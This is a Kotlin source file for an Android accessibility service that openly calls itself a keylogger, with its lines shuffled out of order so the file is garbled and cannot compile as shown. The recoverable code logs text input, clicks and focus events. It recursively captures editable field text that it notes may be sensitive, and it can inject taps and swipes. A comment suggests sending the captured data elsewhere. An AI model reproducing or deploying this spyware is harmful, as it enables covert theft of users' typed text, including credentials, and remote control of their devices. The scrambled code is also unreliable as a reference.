package com.anti.rootadbcontroller.services

import android.graphics.Path
 * An accessibility service that acts as a keylogger, capturing user interactions







        if (nodeInfo == null) return
            keylogData.add(capturedText)
            if (childNode != null) {

        super.onServiceConnected()
     * @param x The x-coordinate of the tap.
        }
    }
     * @param x2 The ending x-coordinate of the swipe.
            moveTo(x1, y1)

     * @return A list of strings, where each string is a logged event.
    /**
}
import android.accessibilityservice.GestureDescription
/**
class KeyloggerAccessibilityService : AccessibilityService() {
    private val keylogData = mutableListOf<String>()
                "Text Changed: ${event.text}"
                "Clicked: ${event.className} - ${event.text}"
                "Text Selection: ${event.text}"
        }
        }
    private fun extractNodeInfo(nodeInfo: AccessibilityNodeInfo?) {
            Log.d(TAG, capturedText)
            val childNode = nodeInfo.getChild(i)
    }
    override fun onServiceConnected() {
     * Simulates a tap gesture at the specified screen coordinates.
            moveTo(x, y)
        dispatchGesture(gestureBuilder.build(), null, null)
     * @param y1 The starting y-coordinate of the swipe.
        val swipePath = Path().apply {
        gestureBuilder.addStroke(GestureDescription.StrokeDescription(swipePath, 0, duration))
     * Retrieves the data collected by the keylogger.

    }
import android.accessibilityservice.AccessibilityService

 */

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ->
            AccessibilityEvent.TYPE_VIEW_CLICKED ->
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED ->
            else -> ""
            // In a real application, you might want to save this data or send it somewhere

            val capturedText = "Captured from ${nodeInfo.className}: ${nodeInfo.text}"
        for (i in 0 until nodeInfo.childCount) {
        }

    /**
        val tapPath = Path().apply {

     * @param x1 The starting x-coordinate of the swipe.
    fun simulateSwipe(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long) {
        val gestureBuilder = GestureDescription.Builder()
    /**
    }
        keylogData.clear()
import android.view.accessibility.AccessibilityNodeInfo
 * accessibility permission to be granted by the user.
    }
        val eventText = when (eventType) {



            keylogData.add(eventText)
    }
        if (nodeInfo.text != null && nodeInfo.isEditable) {
        // Recursively process child nodes
            }
    }

    fun simulateTap(x: Float, y: Float) {
        gestureBuilder.addStroke(GestureDescription.StrokeDescription(tapPath, 0, 50))
     * Simulates a swipe gesture between two points on the screen.
     */


        return keylogData.toList()
    fun clearKeylogData() {
import android.view.accessibility.AccessibilityEvent
 * for simulating user gestures like taps and swipes. This service requires the
        private const val TAG = "KeyloggerService"
        val eventType = event.eventType
                "Focused: ${event.className} - ${event.text}"
                "Selected: ${event.className} - ${event.text}"
                "Window Changed: ${event.className}"
            Log.d(TAG, eventText)
        extractNodeInfo(rootInActiveWindow)
        // Check if this node has editable text that might contain sensitive information

                childNode.recycle()
        Log.d(TAG, "Keylogger service interrupted")
    }
     */
        val gestureBuilder = GestureDescription.Builder()
    /**
     * @param duration The duration of the swipe in milliseconds.
        }
    }
    fun getKeylogData(): List<String> {
     */
import android.util.Log
 * such as text input, view clicks, and focus changes. It also provides methods
    companion object {
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
            AccessibilityEvent.TYPE_VIEW_FOCUSED ->
            AccessibilityEvent.TYPE_VIEW_SELECTED ->
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ->
        if (eventText.isNotEmpty()) {
        // Extract information from the accessibility node tree

        }
                extractNodeInfo(childNode)
    override fun onInterrupt() {
        Log.d(TAG, "Keylogger service connected")
     * @param y The y-coordinate of the tap.


     * @param y2 The ending y-coordinate of the swipe.
            lineTo(x2, y2)
        dispatchGesture(gestureBuilder.build(), null, null)
     */
     * Clears all the data collected by the keylogger.
